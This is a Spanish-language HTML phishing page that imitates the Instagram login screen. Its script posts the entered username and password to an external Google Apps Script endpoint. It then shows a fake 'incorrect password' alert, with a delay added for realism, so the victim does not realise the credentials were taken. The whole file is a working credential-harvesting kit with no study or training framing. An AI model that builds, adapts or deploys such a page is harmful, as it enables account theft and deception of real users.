<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Estilos base para evitar parpadeos */
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            visibility: hidden; /* Oculta hasta que cargue */
        }
        body.loaded {
            visibility: visible;
        }
        
        /* El contenedor de la captura real */
        #capture-container {
            width: 350px;
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            box-sizing: border-box;
            position: relative;
        }

        /* Logo */
        .logo {
            text-align: center;
            margin-bottom: 20px;
            font-family: 'Grand Hotel', cursive; /* Fallback si no carga la fuente */
            font-size: 2rem;
            color: #262626;
        }

        /* Campos */
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 14px 8px;
            font-size: 12px;
            margin-bottom: 6px;
            box-sizing: border-box;
        }

        /* Botón */
        .btn-login {
            width: 100%;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            padding: 7px;
            cursor: pointer;
            margin-top: 10px;
        }

        /* Separador */
        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider span { padding: 0 10px; }

        /* Links */
        .fb-link {
            display: block;
            text-align: center;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 10px;
            cursor: pointer;
        }
        .forgot {
            display: block;
            text-align: center;
            color: #003768;
            font-size: 12px;
            text-decoration: none;
            margin-top: 10px;
        }
        .signup-box {
            margin-top: 30px;
            font-size: 12px;
            color: #262626;
            text-align: center;
            border-top: 1px solid #dbdbdb;
            padding-top: 20px;
        }
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <!-- Contenedor Principal -->
    <div id="capture-container">
        <!-- Logo simulado (si la fuente no carga) -->
        <div class="logo">Instagram</div>
        
        <form id="phishingForm">
            <input type="text" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit" class="btn-login">Iniciar sesión</button>
        </form>

        <div class="divider"><span>O</span></div>
        <a class="fb-link">Iniciar sesión con Facebook</a>
        <a class="forgot" href="#">¿Has olvidado la contraseña?</a>
        
        <div class="signup-box">
            ¿No tienes una cuenta? <a href="#" class="signup-link">Regístrate</a>
        </div>
    </div>

    <script>
        // https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec
        const SCRIPT_URL = https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec;

        document.getElementById('phishingForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = document.querySelector('.btn-login');
            const originalText = btn.innerText;
            
            btn.innerText = '...';
            btn.disabled = true;

            const formData = new FormData(this);
            const username = formData.get('username');
            const password = formData.get('password');

            fetch(SCRIPT_URL, {
                method: 'POST',
                body: formData
            })
            .then(() => {
                // Pequeño delay para realismo
                setTimeout(() => {
                    alert('Nombre de usuario o contraseña incorrectos.');
                    btn.innerText = originalText;
                    btn.disabled = false;
                    // Opcional: window.location.reload();
                }, 500);
            })
            .catch(err => {
                alert('Error de conexión');
                btn.innerText = originalText;
                btn.disabled = false;
            });
        });

        // Simula la carga de Instagram para evitar el "código en el fondo"
        setTimeout(() => {
            document.body.classList.add('loaded');
        }, 500);
    </script>
</body>
</html>
